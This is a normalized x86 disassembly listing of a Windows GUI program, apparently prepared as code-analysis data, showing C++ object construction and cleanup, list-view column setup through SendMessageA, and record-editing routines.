lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402780
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0xdc ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0xd4 ]
mov eax [ ecx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov edx [ esi + 0xe4 ]
mov eax [ edx - 0x8 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
mov ecx esi
call sub_43e178
pop esi
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop esi
retn
sub_402820
push 0xffffffff
push sub_45bb0c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x114 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebp [ esi + 0x118 ]
mov [ ebp ] edx
mov eax [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] eax
mov edx [ rw-data ]
mov [ esi + 0x120 ] edx
mov eax [ rw-data ]
mov [ esi + 0x124 ] eax
push rw-data
mov [ esp + 0x20 ] 0x6
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
lea ecx [ esi + 0x120 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_402950
push 0xffffffff
push sub_45bb6e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_402a20
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0xc
lea eax [ esi + 0x110 ]
push 0xff
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
add esi 0x124
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_402b00
push 0xffffffff
push sub_45bb93
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x96
mov [ esp + 0x10 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
push 0x0
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_4049e0
mov ecx [ esp + 0xc ]
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_402ba0
push 0xffffffff
push sub_45bc0f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0x98 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x128 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x2
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x1
call sub_421723
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_402c90
push esi
push edi
mov esi ecx
call sub_43e113
push 0xffffffff
push 0xffffffff
lea edi [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx edi
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx edi
call sub_43c126
mov eax [ esi + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
push 0x50
push 0x4
mov ecx [ esi + 0x78 ]
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x5
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x78
push 0x6
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push ecx
call edi
mov ecx esi
call sub_402dc0
pop edi
mov eax 0x1
pop esi
retn
sub_402dc0
push 0xffffffff
push sub_45bc28
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
mov ebx [ SendMessageA@IAT ]
push esi
push edi
mov esi ecx
xor edi edi
mov eax [ esi + 0x78 ]
push edi
push edi
push 0x1009
push eax
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] edi
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x98 ]
lea ebp [ esi + 0x98 ]
push edi
push ecx
push 0xffffffff
mov ecx ebp
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x160 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ ebp ]
mov ecx ebp
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x1a8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x1ac ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x1b0 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov eax [ esi + 0x1b4 ]
mov ecx ebx
push eax
push 0x3
push edi
call sub_43c1c5
mov eax [ esi + 0x1b8 ]
mov ecx ebx
push eax
push 0x4
push edi
call sub_43c1c5
mov eax [ esi + 0x1bc ]
mov ecx ebx
push eax
push 0x5
push edi
call sub_43c1c5
mov eax [ esi + 0x1c0 ]
mov ecx ebx
push eax
push 0x6
push edi
call sub_43c1c5
mov edx [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ edx + 0x14 ]
mov eax [ esi + 0x160 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_402f40
push 0xffffffff
push sub_45bd08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x130
mov eax [ rw-data ]
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x144 ] 0x0
call sub_403fa0
mov [ esp + 0x140 ] 0x1
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0x15
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0x14
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x13
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x12
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x11
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x140 ] 0x10
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x140 ] 0xf
call sub_442148
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x140 ] 0xe
call sub_44f0ac
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x140 ] 0xd
call sub_44f0ac
mov [ esp + 0x140 ] 0xc
mov ecx [ esp + 0x128 ]
lea edx [ esp + 0x8 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x14 ]
mov eax [ edi + 0x98 ]
add esp 0xc
lea esi [ edi + 0x98 ]
push 0x0
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0xb
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0xa
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x9
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x8
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x7
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x140 ] 0x6
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x140 ] 0x5
call sub_442148
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x140 ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x140 ] 0x3
call sub_44f0ac
mov [ esp + 0x140 ] 0x2
jmp r-xdata
mov eax [ edi + 0x134 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_44f0ac
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0x0
call sub_43da87
lea ecx [ esp + 0x8 ]
mov [ esp + 0x140 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x138 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x13c
retn
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
mov ecx esi
call [ eax + 0x20 ]
lea ecx [ esp + 0x130 ]
push ecx
lea ecx [ edi + 0x1ac ]
call sub_442281
lea edx [ esp + 0x12c ]
lea ecx [ edi + 0x1c0 ]
push edx
call sub_442281
lea eax [ esp + 0x134 ]
lea ecx [ edi + 0x1bc ]
push eax
call sub_442281
lea ecx [ esp + 0x124 ]
push ecx
lea ecx [ edi + 0x1b8 ]
call sub_442281
lea edx [ esp + 0x128 ]
lea ecx [ edi + 0x1a8 ]
push edx
call sub_442281
lea eax [ esp + 0x120 ]
lea ecx [ edi + 0x1b4 ]
push eax
call sub_442281
lea ecx [ esp + 0x11c ]
push ecx
lea ecx [ edi + 0x1b0 ]
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_402dc0
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov edx [ esi ]
mov ecx esi
call [ edx + 0x10 ]
jmp r-xdata
lea ecx [ esp + 0xc ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
sub_403270
push 0xffffffff
push sub_45bda3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x128 ]
mov [ esp + 0x10 ] 0x9
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x8
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x7
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403350
push 0xffffffff
push sub_45bf29
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x134
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_403fa0
push 0x1
mov ecx ebp
mov [ esp + 0x150 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x140 ]
mov [ esp + 0x150 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x6
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x13c ]
mov [ esp + 0x150 ] 0xc
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x5
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x144 ]
mov [ esp + 0x150 ] 0xd
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x4
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x134 ]
mov [ esp + 0x150 ] 0xe
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x138 ]
mov [ esp + 0x150 ] 0xf
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0x14c ] 0x10
push eax
lea ecx [ esp + 0x130 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x12c ]
mov [ esp + 0x150 ] 0x11
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0xa
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x9
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x8
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x4
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x3
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x2
call sub_44f0ac
mov [ esp + 0x14c ] 0x1
jmp r-xdata
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0x27
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x26
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x25
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x24
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x23
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x22
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x21
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x20
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x1f
call sub_44f0ac
mov [ esp + 0x14c ] 0x1e
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push ebx
lea eax [ esp + 0x18 ]
push edi
push eax
mov ecx esi
mov [ esp + 0x158 ] 0x12
call sub_43c1f0
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x158 ] 0x13
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14c ] 0x12
call sub_442148
mov ecx [ esp + 0x10 ]
mov eax [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x144 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x140
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x24 ]
lea eax [ esp + 0x13c ]
lea ecx [ ebp + 0x1ac ]
push eax
call sub_442281
lea ecx [ esp + 0x138 ]
push ecx
lea ecx [ ebp + 0x1c0 ]
call sub_442281
lea edx [ esp + 0x140 ]
lea ecx [ ebp + 0x1bc ]
push edx
call sub_442281
lea eax [ esp + 0x130 ]
lea ecx [ ebp + 0x1b8 ]
push eax
call sub_442281
lea ecx [ esp + 0x134 ]
push ecx
lea ecx [ ebp + 0x1a8 ]
call sub_442281
lea edx [ esp + 0x12c ]
lea ecx [ ebp + 0x1b4 ]
push edx
call sub_442281
lea eax [ esp + 0x128 ]
lea ecx [ ebp + 0x1b0 ]
push eax
call sub_442281
mov edx [ esi ]
mov ecx esi
call [ edx + 0x28 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx ebp
call sub_402dc0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0x1d
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x1c
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x1b
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x1a
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x19
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x18
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x17
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x16
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x15
call sub_44f0ac
mov [ esp + 0x14c ] 0x14
jmp r-xdata
sub_4038f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_45bf50
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
push 0x0
push 0x0
push 0x1042
mov eax [ edi + 0x78 ]
push eax
call [ SendMessageA@IAT ]
test eax eax
jge r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x8 ] ecx
push 0x0
lea edx [ esp + 0x10 ]
push eax
push edx
lea ecx [ edi + 0x5c ]
mov [ esp + 0x24 ] 0x0
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call sub_442148
mov eax [ esp + 0x8 ]
mov edx [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
push 0x0
push eax
push 0xffffffff
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push rw-data
call sub_4496b7
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ esi ]
mov ecx esi
call [ edx + 0x2c ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
mov ecx edi
call sub_402dc0
push eax
push eax
push rw-data
call sub_4496b7
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_4039f0
push 0xffffffff
push sub_45c0d9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x134
push ebx
push ebp
push esi
mov ebp ecx
xor ebx ebx
push edi
push ebx
lea ecx [ esp + 0x1c ]
call sub_403fa0
push 0x1
mov ecx ebp
mov [ esp + 0x150 ] ebx
call sub_440b18
mov eax [ ebp + 0x78 ]
push ebx
push ebx
push 0x1042
push eax
call [ SendMessageA@IAT ]
mov edi eax
cmp edi ebx
jge r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
lea esi [ ebp + 0x5c ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x140 ]
mov [ esp + 0x150 ] 0xb
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x6
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x13c ]
mov [ esp + 0x150 ] 0xc
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x5
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x144 ]
mov [ esp + 0x150 ] 0xd
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x4
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x134 ]
mov [ esp + 0x150 ] 0xe
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push ebx
lea edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x138 ]
mov [ esp + 0x150 ] 0xf
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x3
lea eax [ esp + 0x14 ]
push edi
push eax
mov ecx esi
call sub_43c1f0
mov [ esp + 0x14c ] 0x10
push eax
lea ecx [ esp + 0x130 ]
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
push 0x2
lea ecx [ esp + 0x14 ]
push edi
push ecx
mov ecx esi
call sub_43c1f0
push eax
lea ecx [ esp + 0x12c ]
mov [ esp + 0x150 ] 0x11
call sub_442281
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14c ] bl
call sub_442148
lea ecx [ esp + 0x18 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0xa
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x9
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x8
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x4
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x3
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x2
call sub_44f0ac
mov [ esp + 0x14c ] 0x1
jmp r-xdata
mov ecx [ esp + 0x158 ]
mov [ ecx ] ebx
lea ecx [ esp + 0x140 ]
mov [ esp + 0x14c ] 0x27
call sub_442148
lea ecx [ esp + 0x13c ]
mov [ esp + 0x14c ] 0x26
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x14c ] 0x25
call sub_442148
lea ecx [ esp + 0x134 ]
mov [ esp + 0x14c ] 0x24
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x14c ] 0x23
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x14c ] 0x22
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x14c ] 0x21
call sub_442148
lea ecx [ esp + 0xec ]
mov [ esp + 0x14c ] 0x20
call sub_44f0ac
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x14c ] 0x1f
call sub_44f0ac
mov [ esp + 0x14c ] 0x1e
mov edx [ rw-data ]
mov [ esp + 0x10 ] edx
push ebx
lea eax [ esp + 0x18 ]
push edi
push eax
mov ecx esi
mov [ esp + 0x158 ] 0x12
call sub_43c1f0
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
mov [ esp + 0x158 ] 0x13
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14c ] 0x12
call sub_442148
mov ecx [ esp + 0x10 ]
mov eax [ ebp + 0x98 ]
lea esi [ ebp + 0x98 ]
push ebx
push ecx
push 0xffffffff
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x74 ]
call sub_44f0ac
lea ecx [ esp + 0x18 ]
mov [ esp + 0x14c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x144 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x140
retn 0x8
